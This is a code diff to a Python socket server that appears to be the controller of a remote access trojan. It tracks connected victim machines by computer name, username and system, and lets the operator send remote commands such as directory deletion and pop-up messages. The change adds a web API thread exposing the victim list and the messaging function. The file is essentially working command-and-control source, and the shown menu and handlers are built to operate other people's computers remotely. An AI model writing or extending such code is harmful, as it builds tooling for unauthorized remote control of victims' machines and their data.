@@ -1,9 +1,13 @@
+# Standard Libraries
 from prettytable import PrettyTable
 import threading
 import socket
 import time
 import os
 import re
+
+# Third-Party Libraries
+import webapi
 
 port = 5005
 buffer = 16384
@@ -59,7 +63,17 @@ def RemoteConnect():
         try:
             conn, address = objSocket.accept()
             clients.append(conn)
-            clientInfo.append([address, str(conn.recv(buffer), "utf-8").split("\n")])
+
+            serverDetails = str(conn.recv(buffer), "utf-8").split("\n")
+            temp = {}
+
+            temp["computer"] = serverDetails[0]
+            temp["username"] = serverDetails[1]
+            temp["system"] = serverDetails[2]
+            temp["file"] = serverDetails[3]
+            temp["ip"] = address[0]
+            temp["port"] = address[1]
+            clientInfo.append(temp)
 
         except socket.error:
             objSocket.close()
@@ -115,15 +129,17 @@ def ClientCommands():
     print("[-dld] Delete Directory               |")
     print("______________________________________|\n")
 
-def VBSMessageBox():
-    message = input("\nType Message: ").strip()
+def VBSMessageBox(connection, message):
+    # message = input("\nType Message: ").strip()
+    print(clients[connection], message)
+
     if (len(message) >= 1000):
         print("[-] Maximum Length: 1000 Characters")
 
     elif not (len(message) <= 0):
-        send("msgbox")
+        clients[connection].send(b"msgbox")
         if (conn_stream()):
-            send(message)
+            clients[connection].send(bytes(message, "utf-8"))
 
     print(str(recv(buffer), "utf-8") + "\n")
 
@@ -495,11 +511,11 @@ def adjustTable():
 
         table.add_row([
             str(connection),
-            clientInfo[connection][1][0],
+            clientInfo[connection]['computer'],
             network[0] + ":" + str(network[1]),
-            clientInfo[connection][1][1],
-            clientInfo[connection][1][2],
-            clientInfo[connection][1][3]
+            clientInfo[connection]['username'],
+            clientInfo[connection]['system'],
+            clientInfo[connection]['file']
         ])
 
 def SelectConnection():
@@ -611,17 +627,19 @@ def SelectConnection():
             break
 
         finally:
+            webapi.app.current = None
             if (len(clients) == 0):
                 clientInfo.clear()
 
 def RemoteControl(connection):
-    global client, IP_Address, PC_Name, PC_Username, PC_System
+    global current, client, IP_Address, PC_Name, PC_Username, PC_System
 
+    webapi.app.current = connection
     client = clients[connection]
-    IP_Address = clientInfo[connection][0][0]
-    PC_Name = clientInfo[connection][1][0]
-    PC_Username = clientInfo[connection][1][1]
-    PC_System = clientInfo[connection][1][2]
+    IP_Address = clientInfo[connection]['ip']
+    PC_Name = clientInfo[connection]['computer']
+    PC_Username = clientInfo[connection]['username']
+    PC_System = clientInfo[connection]['system']
 
     print(f"Connected: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
     while (True):
@@ -714,8 +732,17 @@ def RemoteControl(connection):
             client.close()
             break
 
-t = threading.Thread(target=RemoteConnect)
-t.daemon = True
-t.start()
+webapi.app.clients = clients
+webapi.app.clientInfo = clientInfo
+webapi.app.VBSMessageBox = VBSMessageBox
+webapi.app.clients_lock = threading.Lock()
+
+t1 = threading.Thread(target=RemoteConnect)
+t1.daemon = True
+t1.start()
+
+t2 = threading.Thread(target=webapi.app.run)
+t2.daemon = True
+t2.start()
 
 SelectConnection()
